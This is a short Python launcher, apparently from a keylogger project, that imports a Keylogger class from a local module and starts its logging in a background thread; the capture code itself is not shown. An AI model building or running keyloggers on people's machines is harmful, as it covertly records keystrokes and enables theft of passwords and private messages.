from threading import Thread

from logger import Keylogger

logging = True

log = Keylogger(logging)

app = Thread(name='Keylogger', target=log.start_logging)
app.start()
